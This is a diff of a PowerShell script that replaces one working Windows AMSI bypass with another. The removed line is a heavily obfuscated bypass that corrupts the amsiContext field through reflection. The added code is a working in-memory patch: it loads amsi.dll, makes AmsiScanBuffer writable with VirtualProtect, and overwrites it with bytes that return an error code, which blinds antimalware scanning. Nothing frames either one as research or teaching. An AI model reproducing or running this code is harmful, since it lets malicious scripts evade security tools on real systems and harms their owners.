@@ -1,1 +1,27 @@
-$EgpeDWlZ=$null;$ros="$([chaR](83)+[char](63+58)+[chaR]([ByTE]0x73)+[CHaR]([bYtE]0x74)+[CHAr]([BYtE]0x65)+[CHAR](109)).$(('Má'+'nâ'+'ge'+'me'+'nt').NORMalizE([ChaR](39+31)+[Char](111*13/13)+[cHAR](114+15-15)+[CHar](109)+[CHaR]([BYTE]0x44)) -replace [CHar]([bytE]0x5c)+[char](112*38/38)+[ChAR](123*92/92)+[CHaR](77*36/36)+[chaR]([BYtE]0x6e)+[chaR]([Byte]0x7d)).$([ChAr]([ByTe]0x41)+[CHaR]([ByTE]0x75)+[chaR](33+83)+[CHAr]([byte]0x6f)+[CHAR](43+66)+[chAr](97+43-43)+[CHar]([ByTe]0x74)+[chaR]([byTe]0x69)+[cHAR]([BYtE]0x6f)+[chaR]([BYTe]0x6e)).$([cHAR]([ByTe]0x41)+[CHaR]([BYTe]0x6d)+[cHAr]([ByTE]0x73)+[ChaR]([Byte]0x69)+[cHar](85+67-67)+[CHAr]([BYTE]0x74)+[cHAr](105*42/42)+[ChAR]([Byte]0x6c)+[Char](115))";$tjsidufstlvccv="+[chAr]([BYTe]0x66)+[CHAr](121)+[CHAr](109)+[CHAr](101+94-94)+[CHAr]([ByTE]0x72)+[cHaR]([BYTe]0x76)+[chAR]([byTE]0x66)+[CHar](105)+[chAR]([BytE]0x6b)+[chAR]([BYte]0x69)+[cHar]([bYte]0x66)+[cHAr](112*48/48)+[cHAr](118+48-48)+[chaR](118+71-71)+[cHAR](97)+[cHaR](97)+[char]([bYTe]0x6f)+[CHaR](100)+[CHar]([bytE]0x69)+[chAr](30+79)+[chAr]([byte]0x72)+[cHAr](118*15/15)+[Char](113)+[chAR]([bYte]0x75)+[ChAr]([BYTE]0x6c)+[CHAr](102*73/73)+[ChaR](95+3)+[char]([byTE]0x72)+[ChAr]([BYte]0x6a)";[Threading.Thread]::Sleep(1907);[Runtime.InteropServices.Marshal]::("$(('WríteÎn'+'t32').NOrmALizE([cHAr](70)+[CHaR]([bYte]0x6f)+[cHAr]([bYtE]0x72)+[Char]([byTE]0x6d)+[cHAr](68*28/28)) -replace [ChAr](92+33-33)+[cHAR]([BYte]0x70)+[chAr](123+68-68)+[CHAR](77*3/3)+[char]([byTe]0x6e)+[ChAR](125*81/81))")([Ref].Assembly.GetType($ros).GetField("$(('ämsîCônt'+'ext').NoRmAlIzE([CHar]([bYte]0x46)+[CHaR](111+33-33)+[cHAr]([bYTe]0x72)+[chAR]([bytE]0x6d)+[cHAr](68*20/20)) -replace [cHAR]([Byte]0x5c)+[ChaR](112*25/25)+[cHaR]([ByTE]0x7b)+[cHAR]([bYTe]0x4d)+[ChaR](66+44)+[CHAr](125))",[Reflection.BindingFlags]"NonPublic,Static").GetValue($EgpeDWlZ),0x6b2a4776);
+$Win32 = @"
+
+using System;
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+}
+"@
+
+Add-Type $Win32
+
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
